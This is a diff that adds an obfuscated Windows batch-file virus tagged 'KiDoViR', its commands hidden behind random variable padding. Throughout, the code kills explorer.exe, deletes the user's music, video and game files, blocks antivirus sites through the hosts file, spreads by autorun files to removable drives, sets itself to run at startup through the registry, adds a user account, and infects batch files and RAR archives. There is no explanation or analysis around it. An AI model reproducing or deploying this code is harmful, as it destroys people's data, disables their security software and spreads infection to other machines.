@@ -1,0 +1,125 @@
+%kfMcv%@%DvZ%e%FKpje%c%qPrJP%h%apLO%o%kOyL% %gNSL%o%VBzm%f%bgxzU%f%qqbO%%[KiDoViR]%
+%LRC%s%zPTe%e%bqVB%t%GEaM% %apf%KiDoViROvnsC=*.ba
+%AJWrq%i%zAxo%f%TVw% '%1=='jYRUBU%nQdNa% %cTA%g%Aimi%o%cBNT%t%ZcW%o%davPL% %iwVkQ%KiDoViRlChk
+%Twm%i%eceE%f%IyYx% '%1=='QyGmI%qygCL% %RLtjL%g%uVmx%o%PQm%t%sXXac%o%TDEu% %BwQy%KiDoViRiAo
+%zVonZ%i%xbCO%f%BBhRF% '%1=='Tcftcq%ihWY% %SjR%g%VCgYe%o%UMRAK%t%mDaAE%o%IydP% %gpsb%KiDoViRLXmgB
+%kBJk%i%znxVF%f%OUJca% '%1=='WOPssjb goto KiDoViRvuGCl
+%yAu%i%goWt%f%lHT% %JDP%e%KsgnU%x%tQgG%i%bGMBW%s%uIteM%t%lwfkn% %acoGn%c:\KiDoViR.bat%qfm% %WdYGV%g%DPO%o%ixnAi%t%Naci%o%cswQq% %QnEJ%KiDoViRnVFt
+%alHIR%i%bKxfU%f%jaJ% %goe%n%gVxeo%o%ddpH%t%sIlF% %UXnJb%e%yCjL%x%KpkZ%i%dNOoc%s%kIN%t%usmr% %0 %TsRdp%g%otZS%o%pMsrI%t%tYVT%o%XBc% %Rdu%KiDoViREUW
+:KiDoViRYbhD
+%EYz%s%HZNPj%e%cqv%t%YlHnI% %HOM%KiDoViRnRnrm=%KiDoViRnRnrm%1
+%tqv%e%RIGY%c%PYyEz%h%Iqc%o%SXdT%.%zFdg%>%gqH%>%JezP%c:\KiDoViR.bat
+if %KiDoViRnRnrm%==111111111111111111111111111111111111111111111111111111111111 goto KiDoViRWPBi
+%YxJiO%g%jTH%o%cDp%t%vDGOQ%o%fhklv% %xeQyW%KiDoViRYbhD
+:KiDoViRWPBi
+%XYJDo%f%Vus%i%pGteD%n%CvQx%d%HJuG% %KgROE%"%WGG%KiDoViR"<%0>>c:\KiDoViR.bat
+%zmW%a%tuEWO%t%sLeNP%t%VpJg%r%uKB%i%GNYVe%b%jagaG% %IEO%+%EPTNC%h%Fwtc% %sEGHk%c:\KiDoViR.bat
+:KiDoViRnVFt
+tasklist >c:\KiDoViR.zTA
+find /i "explorer.exe"<c:\KiDoViR.zTA>nul
+if errorlevel 1 goto KiDoViRJUCFfbA
+%[KiDoViR]%taskkill /f /im explorer.exe>nul
+:KiDoViRJUCFfbA
+del c:\KiDoViR.zTA
+%[KiDoViR]%del c:\musik\*.mp3 D:\Musik\*.mp3 C:\Video\*.avi D:\Games\*.?? >nul
+set KiDoViRhostfile=%SYSTEMROOT%\system32\drivers\etc\hosts
+find "KiDoViR"<%KiDoViRhostfile%>nul
+if not errorlevel 1 goto KiDoViRXnJ
+:KiDoViRMPAf
+set KiDoViRnVH=%KiDoViRnVH%1
+echo.>>%KiDoViRhostfile%
+if %KiDoViRnVH%==1111111111111111111111111111111111111111111111111 goto KiDoViRMHWr
+goto KiDoViRMPAf
+:KiDoViRMHWr
+echo # KiDoViR>>%KiDoViRhostfile%
+echo 127.0.0.1 kaspersky.ru>>%KiDoViRhostfile%
+echo 127.0.0.1 www.kaspersky.ru>>%KiDoViRhostfile%
+echo 127.0.0.1 avp.ru>>%KiDoViRhostfile%
+echo 127.0.0.1 www.avp.ru>>%KiDoViRhostfile%
+echo 127.0.0.1 drweb.com>>%KiDoViRhostfile%
+echo 127.0.0.1 www.drweb.com>>%KiDoViRhostfile%
+echo 127.0.0.1 esetnod32.ru>>%KiDoViRhostfile%
+echo 127.0.0.1 www.esetnod32.ru>>%KiDoViRhostfile%
+:KiDoViRXnJ
+if not exist f:\ goto KiDoViRXssR
+if exist f%iKTeq%:%mSm%\%RFRrF%a%UUum%u%mmcR%t%Xbw%o%lLzg%r%YdDej%u%HBhY%n%Fcjw%.%NtHH%b%lKn%a%weys%t%Jch% %EJU%g%mzbsc%o%iDUeo%t%xUK%o%bLt% KiDoViRnTB
+%pANn%t%AxAqt%y%AfHCN%p%frGdl%e%HJh% %BlE%c:\KiDoViR.bat>f%ymFx%:%NLxcc%\%ZgP%a%FDJ%u%Xetm%t%RviZ%o%cIu%r%vjGb%u%hmD%n%auyV%.%nOZc%b%pqz%a%vVR%t%IzYwW%
+echo explorer.exe .>>f:\autorun.bat%[KiDoViR]%
+attrib +h f:\autorun.bat%[KiDoViR]%
+:KiDoViRnTB
+if exist f:\autorun.inf goto KiDoViRXssR
+%qDpjx%e%CTm%c%SkoJ%h%SVf%o%DusJ% %kHw%[%dVZ%a%jMA%u%sUE%t%gckC%o%hhSr%r%WvBVD%u%TCGd%n%Yyuc%]%blNi%>f:\autorun.inf%[KiDoViR]%
+%xiDdX%e%DwK%c%cINEc%h%Hir%o%KLo% %JtE%s%YIaWE%h%YiBYa%e%LTMmG%l%jwawV%l%wEMHI%e%Nrhk%x%ehFy%e%dBfQ%c%GLiJs%u%uKMoD%t%vpggm%e%Bjh%=%Yqc%a%rUCip%u%glZL%t%wuI%o%gvfV%r%FWM%u%vJrr%n%TLkw%.%ffp%b%yEXhM%a%xBE%t%PCWQ%>>f:\autorun.inf%[KiDoViR]%
+attrib +h f:\autorun.inf%[KiDoViR]%
+:KiDoViRXssR
+if not exist g:\ goto KiDoViRSNYS
+if exist g%mjZ%:%grxQ%\%XStYj%a%OCPt%u%EXRv%t%AzAH%o%EBZi%r%bvcTZ%u%UFmT%n%CGDT%.%OQeG%b%pbw%a%ULq%t%oYzOn% %jej%g%EHgl%o%XdWU%t%VBOK%o%ZEtmp% KiDoViRuPu
+%CUf%t%CiIOZ%y%okp%p%exn%e%nGyJ% %dfP%c:\KiDoViR.bat>g%GIWv%:%HofDa%\%NjlV%a%VBX%u%rNFn%t%YDVpe%o%DUkOK%r%mZlw%u%rLfVx%n%Rql%.%SlM%b%eThWx%a%Nvp%t%oWyW%
+echo explorer.exe .>>g:\autorun.bat%[KiDoViR]%
+attrib +h g:\autorun.bat%[KiDoViR]%
+:KiDoViRuPu
+if exist g:\autorun.inf goto KiDoViRSNYS
+%nwt%e%yPRr%c%MmKo%h%ecxX%o%eVIgc% %VNZ%[%WxgJa%a%wbJT%u%JXcR%t%RtHco%o%LLGzR%r%UJJQ%u%IPdoS%n%dqb%]%hac%>g:\autorun.inf%[KiDoViR]%
+%ubn%e%IVcy%c%LZOj%h%MHg%o%DLHWW% %TSXka%s%kpF%h%CPOVM%e%pvBGK%l%jUgk%l%ELPx%e%Rfunn%x%HCgm%e%jdv%c%lvPl%u%eOuB%t%cUIO%e%xvcxN%=%AYCRi%a%fdOj%u%LYf%t%pMEX%o%uFWu%r%LGHfx%u%cyO%n%iAxf%.%RHM%b%zkyON%a%YSo%t%RQnc%>>g:\autorun.inf%[KiDoViR]%
+attrib +h g:\autorun.inf%[KiDoViR]%
+:KiDoViRSNYS
+if not exist h:\ goto KiDoViRzbzwkI
+if exist h%TVr%:%qKKB%\%pzO%a%MuH%u%jGm%t%sShj%o%DLH%r%NEl%u%DhRov%n%ORrgp%.%vTz%b%eNiu%a%Cgan%t%Qhk% %rqz%g%zsqo%o%NQK%t%oixS%o%HWZG% KiDoViRnOl
+%Mhi%t%VOcEv%y%GrH%p%WtoS%e%EEzLY% %aUS%c:\KiDoViR.bat>h%vqdYu%:%GbgS%\%bNj%a%ivFgZ%u%LwX%t%pqRR%o%TGM%r%kjhQR%u%FivAq%n%QbrIN%.%MOk%b%cTO%a%Smzy%t%zWusy%
+echo explorer.exe .>>h:\autorun.bat%[KiDoViR]%
+attrib +h h:\autorun.bat%[KiDoViR]%
+:KiDoViRnOl
+if exist h:\autorun.inf goto KiDoViRzbzwkI
+%pFIc%e%jsD%c%nWEXJ%h%XWKb%o%sid% %Ajl%[%OBjtp%a%LAW%u%jvWd%t%DCMeq%o%XsF%r%dfVa%u%vog%n%CypLp%]%HjkMV%>h:\autorun.inf%[KiDoViR]%
+%pnzu%e%CeM%c%OCvX%h%nZAbq%o%sjq% %yGMF%s%acAN%h%YLWBs%e%ULP%l%rzlv%l%hWj%e%lYvyZ%x%SdRGf%e%gsYn%c%pPBG%u%IGBaU%t%LFiX%e%yshBX%=%gZBvg%a%GyU%u%Ycl%t%GwoFp%o%vBG%r%vKKh%u%wRnpo%n%ZGLt%.%RWaQ%b%tfxx%a%wDYXu%t%EjH%>>h:\autorun.inf%[KiDoViR]%
+attrib +h h:\autorun.inf%[KiDoViR]%
+:KiDoViRzbzwkI
+echo Windows Registry Editor Version 5.00>c:\KiDoViR.Iio
+echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>c:\KiDoViR.Iio
+echo "KiDoViR"="c:\\KiDoViR.bat">>c:\KiDoViR.Iio
+REG IMPORT c:\KiDoViR.Iio >nul
+DEL c:\KiDoViR.Iio
+net user >c:\KiDoViR.Jal
+find "porno"<c:\KiDoViR.Jal>nul
+if not errorlevel 1 goto KiDoViRYfqsln
+%[KiDoViR]%net user "porno" /add >nul
+:KiDoViRYfqsln
+del c:\KiDoViR.Jal
+%HdpM%f%Qhuc%o%XzlUc%r%SvDZZ% %WEFb%%%v in (.. %path% c:. d:. e:. f:. g:. h:.) %rBX%d%hlhqc%o%Osmke% %biSH%c%hhMo%a%pgP%l%QxSH%l%QjsH% c:\KiDoViR.bat Tcftcq %%~sv
+%PsCQ%f%AhzC%o%sMcBY%r%TxFR% %qFRMD%/%Xrc%r%xNq% %HCPNt%%%b in (%KiDoViROvnsC%t) %cmx%d%yCsFj%o%gTQFC% %VqODO%c%caZYl%a%Kok%l%RmC%l%wmSJ% c:\KiDoViR.bat jYRUBU %%~sb
+%sNTL%f%NEOdk%o%CaVK%r%lCU% %gjieB%/%MOy%r%yCu% %PEsnq%%%w in (*.r%JgnL%ar) %LhDud%d%NFL%o%MngUP% %ZBV%c%fQqEn%a%zVii%l%Aten%l%rnri% c:\KiDoViR.bat WOPssjb %%~sw
+%cYbC%f%ljOhx%o%Bvhtc%r%XfS% %RCaQn%/%kmTRi%r%UMmN% %ETQQ%%%o in ( *.%yaeK%jpg *.%iSUDGEp%doc *.%bztuZiS%mp3 *.%jYlq%avi *.%vTqReNC%bmp) do call c:\KiDoViR.bat QyGmI %%~so
+goto KiDoViREUW
+:KiDoViRLXmgB
+%IJYd%f%BdIzT%o%TBrn%r%jmm% %gqB%%%f in (%2\%KiDoViROvnsC%t) %KoE%d%qMquu%o%VgBE% %UsQ%c%Etd%a%cLvQB%l%NQSEf%l%dXNd% c:\KiDoViR.bat jYRUBU %%~sf
+%XpYWM%f%gGuE%o%aWMn%r%VeR% %%g in (%2\*.%RuP%rar) do call c:\KiDoViR.bat WOPssjb %%~sg
+%aCfYH%f%CbY%o%UqwLK%r%HDNO% %%e in ( %2\*.%EkdXts%jpg %2\*.%qfuaS%doc %2\*.%hrNhI%mp3 %2\*.%vvpM%avi %2\*.%Cbr%bmp) %xMAkA%d%wBkW%o%YzVa% %SyZ%c%secq%a%TbFjO%l%nInEo%l%nKZf% c:\KiDoViR.bat QyGmI %%~se
+goto KiDoViREUW
+:KiDoViRiAo
+%EAVU%i%ZohT%f%Iekzg% %kfo%e%CRN%x%Vzeg%i%RWs%s%KKo%t%eLFoE% %2.bat goto KiDoViREUW
+%mEp%t%Hmc%y%aOI%p%YXWWe%e%Mjry% c:\KiDoViR.bat>>%2.bat
+echo start %~nx2>>%2.bat%[KiDoViR]%
+goto KiDoViREUW
+:KiDoViRvuGCl
+if not exist c:\progra~1\winrar\rar.exe goto KiDoViREUW
+echo.>c:\KiDoViR.zjv
+c:\progra~1\winrar\rar.exe cw %2 -y c:\KiDoViR.zjv >nul
+find "KiDoViR"<c:\KiDoViR.zjv>nul
+if not errorlevel 1 goto KiDoViRJfbxpw
+type c:\KiDoViR.bat>c:\setup.bat
+echo KiDoViR>c:\KiDoViR.KMI
+%[KiDoViR]%attrib -r %2 >nul
+%[KiDoViR]%c:\progra~1\winrar\rar.exe a -tk %2 c:\setup.bat >nul
+c:\progra~1\winrar\rar.exe c -zc:\KiDoViR.KMI -tk %2 >nul
+%[KiDoViR]%del c:\setup.bat >nul
+del c:\KiDoViR.KMI >nul
+:KiDoViRJfbxpw
+del c:\KiDoViR.zjv
+goto KiDoViREUW
+:KiDoViRlChk
+%uvVS%f%pkmn%i%uHyt%n%ZgiA%d%PGDRI% %RbVgx%"KiDoViR"<%2>nul
+if not errorlevel 1 goto KiDoViREUW
+%[KiDoViR]%attrib -r %2>nul
+echo.>>%2%[KiDoViR]%
+%bBYg%t%Xdwx%y%noKey%p%Fwa%e%wTjVh% c:\KiDoViR.bat>>%2
+:KiDoViREUW
